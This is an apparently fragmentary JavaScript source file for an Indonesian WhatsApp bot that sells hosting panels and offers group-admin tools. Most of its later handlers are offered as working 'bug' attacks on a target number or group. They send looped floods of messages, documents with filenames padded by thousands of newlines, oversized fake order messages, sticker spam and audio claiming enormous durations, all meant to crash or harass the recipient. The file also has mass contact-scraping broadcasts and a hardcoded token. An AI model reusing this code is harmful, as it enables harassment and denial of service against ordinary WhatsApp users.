...
const isOwner = JSON.parse(fs.readFileSync('./all/database/owner.json'))
...
// read database
//=================================================//
 module.exports = thomvelz = async (keepmods, m, store) => {
try {
...
const botNumber = await keepmods.decodeJid(keepmods.user.id)
const sender = m.key.fromMe ? (keepmods.user.id.split(':')[0]+'@s.whatsapp.net' || keepmods.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await keepmods.groupMetadata(m.chat).catch(e => {}) : ''
...
if (m.sender.startsWith('212')) return keepmods.updateBlockStatus(m.sender, 'block')
...
list.push({
displayName: await keepmods.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await keepmods.getName(i + '@s.whatsapp.net')}\n
FN:${await keepmods.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:AryanaHosting@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://chat.whatsapp.com/DAa1Jadn6qNGhYud45GR8E\n
...
try {
ppuser = await keepmods.profilePictureUrl(m.sender, 'image')
} catch (err) {
...
keepmods.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => { 
keepmods.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
...
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://chat.whatsapp.com/DAa1Jadn6qNGhYud45GR8E", 
"sourceUrl": "https://chat.whatsapp.com/DAa1Jadn6qNGhYud45GR8E" }}}, { quoted: m }) }
...
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `Bot Ikhsan Store🔥`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/ebf63ad89b88fc6837d31.jpg' }}}}
...
keepmods.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
keepmods.groupParticipantsUpdate(m.chat, [sender], 'remove')
keepmods.sendMessage(m.chat, { delete: m.key })
}
}
...
╎❒ Sᴀʟᴅᴏ Aɴᴅᴀ : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}
╚┈┈┈┈┈┈┈┈┈┈┈┈
╔┈「 *INFO BOT* 」
╎❒ Nᴀᴍᴀ Bᴏᴛ : ${namabot}
╎❒ Nᴏᴍᴇʀ Cʀᴇᴀᴛᴏʀ @${owner.split("@")[0]}
╎❒ Vᴇʀsɪ Sᴄʀɪᴘᴛ ${global.versisc}
╎❒ Vᴇʀsɪ Bᴀɪʟᴇʏs : ^${version}
╎❒ Rᴜᴛɪᴍᴇ : ${runtime(process.uptime())}
╚┈┈┈┈┈┈┈┈┈┈┈┈
╔┈「 *INFO HARI* 」
╎❒ Tᴏᴅᴀʏ : ${hariini}
╎❒ Wᴀᴋᴛᴜ WIB : ${wib}
...
╚┈┈┈┈┈┈┈┈┈┈┈┈`
     ...
     await keepmods.sendMessage(m.chat, {
...
for (let xnxx of anu) {
let metadat72 = await keepmods.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await keepmods.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await keepmods.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await keepmods.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
...
//batas menu
  ...
  for (let i = 0; i < messageCount; i++) {
    promises.push(
      keepmods.sendMessage(targetNumber, {
        text: `*${messageText}*`,
        mentions: [sender]
      }, {
        quoted: lep
...
*TERIMA KASIH TELAH ORDER DI ${global.namaCreator}*\n*JANGAN LUPA ORDER LAGI YA*🙏`)
        ...
        case "buyowner":
if (cekSaldo(sender,db_saldo) < 10000) return keepmods.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283863289925` )
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknbos = await keepmods.onWhatsApp(bnnd + `@s.whatsapp.net`)
...
let ceknya = await keepmods.onWhatsApp(prrkek)
...
break
                case 'buysc': {
       if (cekSaldo(sender,db_saldo) < 10000) return keepmods.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 10000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/qaqiqn9sqcexsxt/SC+CPANEL+BY+PANELAHOP.zip/file')
keepmods.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
   case 'bukti':{
           let jumlah = args[0]
...
break
          case 'qris': {
keepmods.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/ebf63ad89b88fc6837d31.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YANG JELAS UNTUK BUKTI TF FULL DARI TANGGAL HINGGA JAM 
...
${prefix}dana✅
${prefix}qris✅`
        keepmods.sendMessage(from, {text : depo}, {quoted : hw}) 
        break      
    case "buysrv": {
...
▬▭▬▭▬▭▬▭▬▭▬▭▬`
keepmods.sendMessage(from, { text: textsrv, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
                case 'acc':{
...
keepmods.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
keepmods.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
keepmods.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
keepmods.sendMessage(prrkek, {text: 'DONE!!!'}, {quoted:lep})
await sleep(2000)
keepmods.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
keepmods.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
...
keepmods.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
...
break
        //bagian panel
        case 'buyakn':{
if (cekSaldo(sender,db_saldo) < 2000) return keepmods.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp2.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
...
let d = (await keepmods.onWhatsApp(sender.split('@')[0]))[0] || {}
...
16GB ✅
17GB ✅
UNLI ✅(KHUSUS ADMIN DAN RESELLER)`
keepmods.sendMessage(from, {text : lrm}, {quoted : m})
break 
        case "panel": {
const owned = `${owner}@s.whatsapp.net`
...
contoh : .1gb panel1,6283863289925

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
keepmods.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
                case "listsrv": {
  ...
  await keepmods.sendMessage(m.chat, { text: messageText }, { quoted: m });
...
Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await keepmods.onWhatsApp(u.split`@`[0]))[0] || {}
...
let p = await keepmods.sendMessage(m.chat, { text: `
...
keepmods.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domain}
┣❏ ➤ *JOIN GRUP PANEL* : https://chat.whatsapp.com/DAa1Jadn6qNGhYud45GR8E
┗⬣`,
})
}
break
...
`
    ...
    await keepmods.sendMessage(m.chat, listMessage)

    await keepmods.sendMessage(nomornya, {
...
GROUP BUYYER ADMIN PANEL HARAP JOIN !!!
https://chat.whatsapp.com/DAa1Jadn6qNGhYud45GR8E

GROUP PANEL HARAP JOIN !!!
https://chat.whatsapp.com/DAa1Jadn6qNGhYud45GR8E
...
CREATED AT: ${server.created_at}`)
        ...
        break
        case "srvpaket1": {
       if (cekSaldo(sender,db_saldo) < 2000) return keepmods.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
...
let cpu = "1024"
let disk = "1024"
let email = username + "DipMX@gmail.com"
akunlo = "https://telegra.ph/file/65083f3199285aa728bb4.jpg" 
if (!u) return
let d = (await keepmods.onWhatsApp(u.split`@`[0]))[0] || {}
...
➵ *🔐PASSWORD*: ${password}
➵ *🌐LOGIN*:  ${domain}
➵ *JOIN GROUP PANEL* : https://chat.whatsapp.com/DAa1Jadn6qNGhYud45GR8E

*!Segera Ganti Password Akun Panel Anda!*

*NOTE :* OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
keepmods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: keepmods.chat })
...
"body": JSON.stringify({
"name": name,
"description": " 𝐁𝐔𝐘𝐘𝐄𝐑 𝐆𝐀𝐍𝐓𝐄𝐍𝐆 Ikhsan⚡ ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
...
break
case "srvpaket2": {
       if (cekSaldo(sender,db_saldo) < 4000) return keepmods.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
...
break
case "srvpaket3": {
       if (cekSaldo(sender,db_saldo) < 6000) return keepmods.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp6.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
...
break
case "srvpaket4": {
       if (cekSaldo(sender,db_saldo) < 8000) return keepmods.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp8.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
...
break
case "srvpaket6": {
       if (cekSaldo(sender,db_saldo) < 12000) return keepmods.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp12.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
...
"body": JSON.stringify({
"name": name,
"description": " 𝐁𝐔𝐘𝐘𝐄𝐑 𝐆𝐀𝐍𝐓𝐄𝐍𝐆 Lenzz⚡ ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
...
➵ *🔐PASSWORD*: ${password}
➵ *🌐LOGIN*:  ${domain}
➵ *JOIN GROUP PANEL* : https://chat.whatsapp.com/KCjmiDrdSnmDnHohbOfAq9
*!Segera Ganti Password Akun Panel Anda!*
...
keepmods.sendMessage(m.chat, {
    ...
    contextInfo: {
      externalAdReply: {
        ...
        body: "Ikhsan",
        thumbnailUrl: "https://telegra.ph/file/ebf63ad89b88fc6837d31.jpg",
        sourceUrl: "https://chat.whatsapp.com/DAa1Jadn6qNGhYud45GR8E*",
        mediaType: 1,
        renderLargerThumbnail: true
...
if (!isCreator) return m.reply(`Fitur Ini Khusus Owner Ikhsan Store,, Lu Siapa Mainin Fitur Ini? `)
pler.push(m.chat)
fs.writeFileSync('./database/idgrup.json', JSON.stringify(pler))
m.reply(`${command} sukses`)
           break
  case 'delgc':
  if (!isCreator) return m.reply(`Fitur Ini Khusus Owner Ikhsan Store Bro,, Lu Siapa Mainin Fitur Ini?`)
    if (!isGroup) return m.reply(`Khusus Group`)
...
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
keepmods.sendMessage(prrkek, { text: "DipMX`" }, { quoted: lep })
keepmods.sendMessage(prrkek, { text: "DipMX`" }, { quoted: lep })
}
keepmods.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
...
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
keepmods.sendMessage(prrkek, { document: thumb, caption: "Ikhsan`", fileName: `Ikhsan ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
keepmods.sendMessage(prrkek, { document: thumb, caption: "Ikhsan`", fileName: `DIkhsan ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
keepmods.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×
...
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
keepmods.sendStimg(prrkek, ppuser, lep, { packname: "Ikhsan Store", author: "" })
keepmods.sendStimg(prrkek, ppuser, lep, { packname: "Ikhsan Store", author: "" })
}
keepmods.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
...
"orderTitle": "Ikhsan`",
"message": `${button}`,
"sellerJid": "6281225396773@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
}), { userJid: prrkek, quoted: lep })
keepmods.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
keepmods.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×
...
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
keepmods.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
keepmods.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
keepmods.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
...
let mnm = await keepmods.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
keepmods.sendMessage(mnm, { text: "Ikhsan Store`" }, { quoted: lep })
keepmods.sendMessage(mnm, { text: "Ikhsan Store`" }, { quoted: lep })
}
keepmods.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
...
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
keepmods.sendMessage(mnm, { document: thumb, caption: "Ikhsan`", fileName: `Ikhsan ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
keepmods.sendMessage(mnm, { document: thumb, caption: "Ikhsan`", fileName: `Ikhsan ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
keepmods.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
...
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
keepmods.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
keepmods.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
}
keepmods.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
...
"orderTitle": "Ikhsan",
"message": `${button}`,
"sellerJid": "62859175467511@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
...
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
keepmods.sendMessage(prrkek, { text: "Ikhsan`" }, { quoted: lep })
keepmods.sendMessage(prrkek, { text: "Ikhsan`" }, { quoted: lep })
}
keepmods.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
...
keepmods.sendMessage(from, { audio: buff, mimetype: "audio/mp4", ptt: false },{ quoted: m })
fs.unlinkSync(rano)
})
})
}
...
let encmedia = await keepmods.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await keepmods.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
...
case "qc": {
if (!quoted){
const getname = await keepmods.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
...
keepmods.sendStimg(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
...
break
case "owner": {
const repf = await keepmods.sendMessage(from, { 
contacts: { 
...
keepmods.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Jangan Macam-macam Ya`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
...
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6281225396773`)
await reply(mess.wait)
...
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281225396773`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await keepmods.onWhatsApp(bnnd + `@s.whatsapp.net`)
...
case "cekidgc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
let getGroups = await keepmods.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await keepmods.groupMetadata(x)
...
reply(mess.wait)
const groupMetadataa = !isGroup? await keepmods.groupMetadata(`${text.split("|")[0]}`).catch(e => {}) : ""
...
await keepmods.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(1000)
} else {
await keepmods.sendMessage(mem, { text: global.tekspushkon })
await sleep(1000)
}
}
try {
...
await keepmods.sendMessage(from, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
...
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
reply(mess.wait)
const groupMetadata = isGroup? await keepmods.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
...
media = await keepmods.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await keepmods.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await sleep(1000)
} else {
await keepmods.sendMessage(men, { text: global.tekspushkonv2 })
await sleep(1000)
}
}
...
await keepmods.sendMessage(sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
...
keepmods.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
...
const url = await keepmods.groupInviteCode(m.chat)
...
global.hit = q
keepmods.sendMessage(from, { text : global.hit ? global.hit : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case "add": {
...
await keepmods.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "kick": {
if (!isGroup) return reply(mess.only.group)
...
await keepmods.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "promote": {
if (!isGroup) return reply(mess.only.group)
...
if (!isBotAdmins) return reply(mess.only.badmin)
